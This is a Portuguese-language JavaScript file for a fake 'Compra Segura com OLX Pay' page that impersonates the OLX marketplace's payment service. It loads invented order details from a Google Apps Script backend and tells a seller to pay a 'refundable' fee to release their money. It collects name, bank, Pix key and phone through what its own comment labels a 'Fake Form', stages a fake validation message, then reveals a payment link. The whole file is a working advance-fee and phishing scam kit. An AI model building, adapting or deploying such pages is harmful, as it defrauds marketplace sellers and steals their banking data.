// ========================================================
// ⚙️ CONFIGURAÇÃO
// Coloque aqui a URL do seu Google Apps Script (a mesma usada no Admin)
const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
// ========================================================

const mainContainer = document.getElementById('main-container');

// --- Inicialização Automática ---
(async function init() {
  // 1. Captura o ID direto da URL (ex: site.com/?id=pay-123)
  const params = new URLSearchParams(window.location.search);
  const id = params.get('id');

  if (!id) {
    renderError('Link incompleto. Verifique se você copiou o link inteiro enviado pelo vendedor.');
    return;
  }

  // 2. Busca os dados no Backend Seguro
  try {
    const response = await fetch(`${WEB_APP_URL}?id=${id}`);
    const json = await response.json();

    if (json.status === 'success') {
      renderContainer(json.data);
    } else {
      renderError(json.message || 'Pedido não encontrado.');
    }
  } catch (err) {
    console.error(err);
    renderError('Erro de conexão. Verifique sua internet e recarregue a página.');
  }
})();

// --- Função de Renderização Principal ---
function renderContainer(dadosBrutos) {
  // Normaliza os dados (transforma chaves em minúsculo para evitar erros de digitação na planilha)
  const dados = {};
  Object.keys(dadosBrutos).forEach(key => {
    dados[key.toLowerCase()] = dadosBrutos[key];
  });

  // Limpa container
  mainContainer.innerHTML = '';

  // Cria Estrutura
  const container = criarElemento('div', { class: 'container' });
  const imgHeader = criarElemento('div', { class: 'header-image' });
  const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura com OLX Pay' });
  const content = criarElemento('div', { class: 'content' });

  // Verifica campos opcionais para evitar "undefined" na tela
  const taxa = dados.taxa || 'R$ --';
  const prazo = dados.prazo || '15 minutos';
  const linkPagamento = dados.linkpagamento || dados['link pagamento'] || '#';

  content.innerHTML = `
    <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
    
    <h2>Detalhes da transação</h2>
    <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>${dados.valor || '---'}</span></p>
    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${dados.frete || 'Grátis'}</span></p>
    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>${dados.tarifa || 'Inclusa'}</span></p>
    ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
    ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação via:</strong> <span>${dados.cartao}</span></p>` : ''}

    <div style="margin-top:15px">
      ${dados.vendas ? `<span class="badge">${dados.vendas}</span>` : ''}
      ${dados.atendimento ? `<span class="badge">${dados.atendimento}</span>` : ''}
      ${dados.entrega ? `<span class="badge">${dados.entrega}</span>` : ''}
    </div>

    <h2>💬 Próximos passos</h2>
    <ul>
      <li>Preencha o formulário abaixo com seus dados bancários para recebimento.</li>
      <li>Após enviar, o botão de pagamento da taxa será liberado.</li>
    </ul>
  `;

  // Formulário de Validação (Fake Form)
  const form = criarElemento('form', { id: 'dadosCliente' });
  const campos = ['nome', 'banco', 'pix', 'telefone'];
  
  campos.forEach(campo => {
    const label = criarElemento('label', { for: campo }, campo.charAt(0).toUpperCase() + campo.slice(1));
    const input = criarElemento('input', { type: 'text', id: campo, name: campo, required: true });
    form.append(label, input);
  });

  const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Confirmar Dados para Recebimento');
  const msgEnvio = criarElemento('p', { id: 'msgEnvio' });
  form.append(btnEnviar, msgEnvio);
  content.appendChild(form);

  // Botão de Pagamento (Oculto inicialmente)
  const btnPagamento = criarElemento('a', { 
    id: 'btn-pagamento', 
    class: 'button hidden', 
    href: linkPagamento 
  }, 'Pagar Taxa e Liberar Valor');
  
  const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
  content.appendChild(btnContainer);

  // Montagem final
  container.append(imgHeader, title, content);
  const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
  container.appendChild(footer);
  mainContainer.appendChild(container);

  // Lógica do Formulário
  form.addEventListener('submit', (e) => {
    e.preventDefault();
    
    btnEnviar.textContent = "Validando...";
    btnEnviar.disabled = true;
    btnEnviar.style.background = "#555";

    setTimeout(() => {
      msgEnvio.textContent = "✅ Dados validados! Pagamento liberado.";
      msgEnvio.style.color = "#00bfa5"; // Verde
      msgEnvio.style.fontWeight = "bold";

      // Esconde form e mostra botão
      form.style.display = 'none'; 
      btnPagamento.classList.remove('hidden');
      btnPagamento.classList.add('visible'); // Se tiver CSS de animação
      btnPagamento.style.display = 'inline-block'; // Garante display
    }, 1500);
  });
}

// --- Função Auxiliar de Erro ---
function renderError(msg) {
  mainContainer.innerHTML = `
    <div class="container" style="text-align:center; padding:40px;">
      <h2 style="color:#ff4d4d;">Atenção</h2>
      <p style="color:#ccc;">${msg}</p>
    </div>`;
}

// --- Função Auxiliar de Criação de Elementos (Mantida do seu código) ---
function criarElemento(tag, attrs = {}, inner = '') {
  const el = document.createElement(tag);
  Object.entries(attrs).forEach(([key, value]) => {
    if (key === 'class') el.className = value;
    else if (key === 'id') el.id = value;
    else if (key === 'href') el.href = value;
    else el.setAttribute(key, value);
  });
  if (typeof inner === 'string') el.innerHTML = inner;
  else if (inner instanceof Node) el.appendChild(inner);
  return el;
}
